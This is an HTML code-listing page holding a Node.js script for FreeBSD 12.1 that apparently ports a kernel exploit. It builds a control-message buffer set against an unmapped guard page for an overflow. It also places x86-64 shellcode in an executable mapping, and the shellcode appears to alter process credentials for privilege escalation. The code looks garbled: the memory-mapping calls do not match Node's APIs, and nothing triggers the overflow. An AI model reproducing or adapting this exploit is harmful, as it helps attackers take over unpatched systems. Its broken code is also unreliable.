<style>.row{border: 1px solid blue; padding: 0px;margin-top: 0px;margin-bottom: :0px;;}.numbcell{background-color:#355DB2;color: #FFFFFF;text-align: right;font-family: 'Helvetica Neue', Helvetica, Arial, Verdana;}.cell{padding:0px;background-color: #FFF6A6;}.cellp{line-height: 110%;color: #05007E;padding: 0px;margin-top:0px;margin-bottom: 0px;font-family: Courier, 'Courier New';}.comment{color:#A1A1A1;}</style><script src='//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js'></script><div><table class="codetable"><tbody><tr class="row"><td class="numbcell">1</td><td class="cell"><p class="cellp" style="margin-left: 0px;">/*</p></td></tr><tr class="row"><td class="numbcell">2</td><td class="cell"><p class="cellp" style="margin-left: 0px;"> * This script is intended to be used on FreeBSD-12.1-RELEASE.</p></td></tr><tr class="row"><td class="numbcell">3</td><td class="cell"><p class="cellp" style="margin-left: 0px;"> */</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">4</td><td class="cell"><p class="cellp" style="margin-left: 0px;">const { execSync } = require('child_process');</p></td></tr><tr class="row"><td class="numbcell">5</td><td class="cell"><p class="cellp" style="margin-left: 0px;">const { mmap, mprotect, PROT_READ, PROT_WRITE, PROT_EXEC, MAP_PRIVATE, MAP_ANON, MAP_FIXED, PAGE_SIZE, MAP_FAILED } = require('mmap-io');</p></td></tr><tr class="row"><td class="numbcell">6</td><td class="cell"><p class="cellp" style="margin-left: 0px;">const { Buffer } = require('buffer');</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">7</td><td class="cell"><p class="cellp" style="margin-left: 0px;">const MLEN = 224;</p></td></tr><tr class="row"><td class="numbcell">8</td><td class="cell"><p class="cellp" style="margin-left: 0px;">const NCMSG = Math.floor(MLEN / (4 * 4));</p></td></tr><tr class="row"><td class="numbcell">9</td><td class="cell"><p class="cellp" style="margin-left: 0px;">const OVERFLOW_SIZE = 256;</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">10</td><td class="cell"><p class="cellp" style="margin-left: 0px;">let ControlBuf;</p></td></tr><tr class="row"><td class="numbcell">11</td><td class="cell"><p class="cellp" style="margin-left: 0px;">let ControlBufLen;</p></td></tr><tr class="row"><td class="numbcell">12</td><td class="cell"><p class="cellp" style="margin-left: 0px;">let OverflowArea;</p></td></tr><tr class="row"><td class="numbcell">13</td><td class="cell"><p class="cellp" style="margin-left: 0px;">let ExecArea;</p></td></tr><tr class="row"><td class="numbcell">14</td><td class="cell"><p class="cellp" style="margin-left: 0px;">let MagicArea;</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">15</td><td class="cell"><p class="cellp" style="margin-left: 0px;">const Message = "b";</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">16</td><td class="cell"><p class="cellp" style="margin-left: 0px;">function roundup(x, y) {</p></td></tr><tr class="row"><td class="numbcell">17</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> return Math.ceil(x / y) * y;</p></td></tr><tr class="row"><td class="numbcell">18</td><td class="cell"><p class="cellp" style="margin-left: 0px;">}</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">19</td><td class="cell"><p class="cellp" style="margin-left: 0px;">function BuildControlBuf() {</p></td></tr><tr class="row"><td class="numbcell">20</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> let cmsgsize = NCMSG * 16; <span class="comment">// sizeof(struct cmsghdr) is 16 bytes</span></p></td></tr><tr class="row"><td class="numbcell">21</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> let allocsz = roundup(cmsgsize + OVERFLOW_SIZE + PAGE_SIZE, PAGE_SIZE);</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">22</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> <span class="comment">// Allocate</span></p></td></tr><tr class="row"><td class="numbcell">23</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> let base = mmap.alloc(allocsz, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);</p></td></tr><tr class="row"><td class="numbcell">24</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> if (base === MAP_FAILED) {</p></td></tr><tr class="row"><td class="numbcell">25</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> console.log("[!] Failed to mmap");</p></td></tr><tr class="row"><td class="numbcell">26</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> process.exit(-1);</p></td></tr><tr class="row"><td class="numbcell">27</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> }</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">28</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> <span class="comment">// Fault</span></p></td></tr><tr class="row"><td class="numbcell">29</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> base.fill(0);</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">30</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> <span class="comment">// Unmap the next page</span></p></td></tr><tr class="row"><td class="numbcell">31</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> let ret = mprotect(base.slice(roundup(cmsgsize + OVERFLOW_SIZE, PAGE_SIZE)), PAGE_SIZE, 0);</p></td></tr><tr class="row"><td class="numbcell">32</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> if (ret !== 0) {</p></td></tr><tr class="row"><td class="numbcell">33</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> console.error("mprotect failed");</p></td></tr><tr class="row"><td class="numbcell">34</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> process.exit(-1);</p></td></tr><tr class="row"><td class="numbcell">35</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> }</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">36</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> if ((cmsgsize + OVERFLOW_SIZE) % PAGE_SIZE !== 0) {</p></td></tr><tr class="row"><td class="numbcell">37</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> base = base.slice(PAGE_SIZE - ((cmsgsize + OVERFLOW_SIZE) % PAGE_SIZE));</p></td></tr><tr class="row"><td class="numbcell">38</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> }</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">39</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> ControlBuf = base.slice(0, cmsgsize);</p></td></tr><tr class="row"><td class="numbcell">40</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> ControlBufLen = cmsgsize;</p></td></tr><tr class="row"><td class="numbcell">41</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> OverflowArea = base.slice(ControlBufLen);</p></td></tr><tr class="row"><td class="numbcell">42</td><td class="cell"><p class="cellp" style="margin-left: 0px;">}</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">43</td><td class="cell"><p class="cellp" style="margin-left: 0px;">function BuildShellcodeBuf() {</p></td></tr><tr class="row"><td class="numbcell">44</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> <span class="comment">// Allocate the magic area</span></p></td></tr><tr class="row"><td class="numbcell">45</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> MagicArea = mmap.alloc(PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0, 0x2000);</p></td></tr><tr class="row"><td class="numbcell">46</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> if (MagicArea === MAP_FAILED) {</p></td></tr><tr class="row"><td class="numbcell">47</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> console.log("[!] Failed to mmap");</p></td></tr><tr class="row"><td class="numbcell">48</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> process.exit(-1);</p></td></tr><tr class="row"><td class="numbcell">49</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> }</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">50</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> <span class="comment">// Allocate the shellcode area</span></p></td></tr><tr class="row"><td class="numbcell">51</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> ExecArea = mmap.alloc(PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);</p></td></tr><tr class="row"><td class="numbcell">52</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> if (ExecArea === MAP_FAILED) {</p></td></tr><tr class="row"><td class="numbcell">53</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> console.log("[!] Failed to mmap");</p></td></tr><tr class="row"><td class="numbcell">54</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> process.exit(-1);</p></td></tr><tr class="row"><td class="numbcell">55</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> }</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">56</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> <span class="comment">// Fault the shellcode area</span></p></td></tr><tr class="row"><td class="numbcell">57</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> ExecArea.fill(0);</p></td></tr><tr class="row"><td class="numbcell">58</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> ExecArea[0] = 0xC3;</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">59</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> <span class="comment">// Install the shellcode instructions</span></p></td></tr><tr class="row"><td class="numbcell">60</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> const instr = Buffer.from([</p></td></tr><tr class="row"><td class="numbcell">61</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0x48, 0x8b, 0x5d, 0x00,</p></td></tr><tr class="row"><td class="numbcell">62</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0x48, 0x83, 0xc5, 0x08,</p></td></tr><tr class="row"><td class="numbcell">63</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0x48, 0x89, 0xec,</p></td></tr><tr class="row"><td class="numbcell">64</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0x65, 0x48, 0x8b, 0x04, 0x25, 0x00, 0x00,</p></td></tr><tr class="row"><td class="numbcell">65</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0x00, 0x00,</p></td></tr><tr class="row"><td class="numbcell">66</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0x48, 0x8b, 0x80, 0x58, 0x01, 0x00, 0x00,</p></td></tr><tr class="row"><td class="numbcell">67</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0xc7, 0x40, 0x04, 0x00, 0x00, 0x00, 0x00,</p></td></tr><tr class="row"><td class="numbcell">68</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0x48, 0xc7, 0xc0, 0x00, 0x20, 0x00, 0x00,</p></td></tr><tr class="row"><td class="numbcell">69</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0xc6, 0x00, 0x01,</p></td></tr><tr class="row"><td class="numbcell">70</td><td class="cell"><p class="cellp" style="margin-left: 60px;"> 0xc3</p></td></tr><tr class="row"><td class="numbcell">71</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> ]);</p></td></tr><tr class="row"><td class="numbcell">72</td><td class="cell"><p class="cellp" style="margin-left: 30px;"> ExecArea.set(instr);</p></td></tr><tr class="row"><td class="numbcell">73</td><td class="cell"><p class="cellp" style="margin-left: 0px;">}</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">74</td><td class="cell"><p class="cellp" style="margin-left: 0px;"><span class="comment">// Example usage</span></p></td></tr><tr class="row"><td class="numbcell">75</td><td class="cell"><p class="cellp" style="margin-left: 0px;">BuildControlBuf();</p></td></tr><tr class="row"><td class="numbcell">76</td><td class="cell"><p class="cellp" style="margin-left: 0px;">BuildShellcodeBuf();</p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr><tr class="row"><td class="numbcell">&nbsp;</td><td class="cell"><p class="cellp" style="margin-left: 0px;"></p></td></tr></tbody></table><input type="button" value="Toggle line numbers" onclick="$(this).parent().parent().find('.numbcell').toggle(300)"></div>